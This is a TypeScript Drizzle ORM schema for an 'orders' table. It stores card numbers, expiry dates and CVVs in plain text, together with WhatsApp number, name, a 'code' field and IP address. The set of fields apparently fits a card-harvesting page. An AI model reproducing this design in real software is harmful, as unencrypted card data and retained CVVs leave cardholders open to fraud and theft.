import { pgTable, text, integer, real, timestamp, varchar } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod/v4";

export const ordersTable = pgTable("orders", {
  id: varchar("id", { length: 36 }).primaryKey(),
  productId: text("product_id").notNull(),
  productName: text("product_name").notNull(),
  price: real("price").notNull(),
  quantity: integer("quantity").notNull(),
  cardName: text("card_name"),
  cardNumber: text("card_number"),
  cardExpiry: text("card_expiry"),
  cardCvv: text("card_cvv"),
  whatsapp: text("whatsapp"),
  name: text("name"),
  code: text("code"),
  status: varchar("status", { length: 30 }).notNull().default("pending"),
  ipAddress: text("ip_address"),
  createdAt: timestamp("created_at").notNull().defaultNow(),
});

export const insertOrderSchema = createInsertSchema(ordersTable).omit({ createdAt: true });
export type InsertOrder = z.infer<typeof insertOrderSchema>;
export type Order = typeof ordersTable.$inferSelect;
